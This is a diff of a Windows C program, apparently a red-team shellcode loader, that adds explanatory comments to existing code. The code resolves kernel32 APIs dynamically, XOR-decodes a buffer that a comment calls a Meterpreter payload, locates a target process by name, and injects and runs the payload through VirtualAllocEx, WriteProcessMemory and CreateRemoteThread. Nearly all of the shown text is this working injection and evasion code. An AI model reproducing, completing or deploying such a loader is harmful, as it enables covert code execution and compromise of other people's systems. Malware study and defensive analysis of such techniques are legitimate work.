@@ -3,9 +3,10 @@
 #include <stdlib.h>
 #include <string.h>
 #include <tlhelp32.h>
-#include "buffer.h"
+#include "buffer.h" // Buffer containing the XORed Meterpreter payload
 
 // Define function pointers for the APIs we will load dynamically
+// These typedefs create aliases for function pointers corresponding to specific Windows API functions
 typedef HANDLE(WINAPI* pfnCREATETOOLHELP32SNAPSHOT)(DWORD, DWORD);
 typedef BOOL(WINAPI* pfnPROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
 typedef BOOL(WINAPI* pfnPROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
@@ -14,6 +15,7 @@ typedef BOOL(WINAPI* pfnWRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZ
 typedef HANDLE(WINAPI* pfnCREATEREMOTETHREAD)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 typedef HANDLE(WINAPI* pfnOPENPROCESS)(DWORD, BOOL, DWORD);
 
+// Declare function pointers for each API function, initially set to NULL
 pfnCREATETOOLHELP32SNAPSHOT pCreateToolhelp32Snapshot = NULL;
 pfnPROCESS32FIRST pProcess32First = NULL;
 pfnPROCESS32NEXT pProcess32Next = NULL;
@@ -23,6 +25,7 @@ pfnCREATEREMOTETHREAD pCreateRemoteThread = NULL;
 pfnOPENPROCESS pOpenProcess = NULL;
 
 // Load all APIs dynamically
+// This function retrieves the addresses of the specified functions from kernel32.dll
 void LoadAPIs() {
     HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
 
@@ -35,12 +38,33 @@ void LoadAPIs() {
     pOpenProcess = (pfnOPENPROCESS)GetProcAddress(hKernel32, "OpenProcess");
 }
 
+/* 
+ * This function performs an XOR encryption/decryption on the input data.
+ *
+ * @param data: Pointer to the data to be encrypted/decrypted
+ * @param data_len: Length of the data
+ *
+ * The function XORs each byte of the input data with a fixed key (0xAA).
+ * This is a simple and symmetric encryption method, meaning the same 
+ * function can be used for both encryption and decryption.
+ */
 void XOR(unsigned char* data, size_t data_len) {
     for (int i = 0; i < data_len; i++) {
         data[i] = data[i] ^ 0xAA;
     }
 }
 
+/*
+ * This function finds the process ID (PID) of a target process by its name.
+ *
+ * @param target_process: Name of the target process (Unicode string)
+ * 
+ * @return process ID of the target process if found, otherwise 0.
+ *
+ * The function takes a snapshot of all processes in the system and then
+ * iterates through them to find a process that matches the given name.
+ * If a matching process is found, its process ID is returned.
+ */
 int FindTarget(const wchar_t* target_process) {
     if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next) {
         LoadAPIs();
@@ -75,6 +99,19 @@ int FindTarget(const wchar_t* target_process) {
     return pid;
 }
 
+/*
+ * This function injects a given payload into a target process.
+ *
+ * @param hProc: Handle to the target process
+ * @param buf: Pointer to the buffer containing the code to be injected
+ * @param buf_len: Length of the buffer
+ *
+ * @return 0 if the injection is successful, otherwise -1.
+ *
+ * The function allocates memory in the target process for the code,
+ * writes the code to this allocated memory, and then creates a remote
+ * thread in the target process to execute the injected code.
+ */
 int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {
     if (!pVirtualAllocEx || !pWriteProcessMemory || !pCreateRemoteThread) {
         LoadAPIs();
@@ -96,6 +133,9 @@ int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {
     return -1;
 }
 
+/*
+ * The entry point for the application. This function contains the main code for the shellcode injection.
+ */
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     LoadAPIs();  // Ensure APIs are loaded before use
 
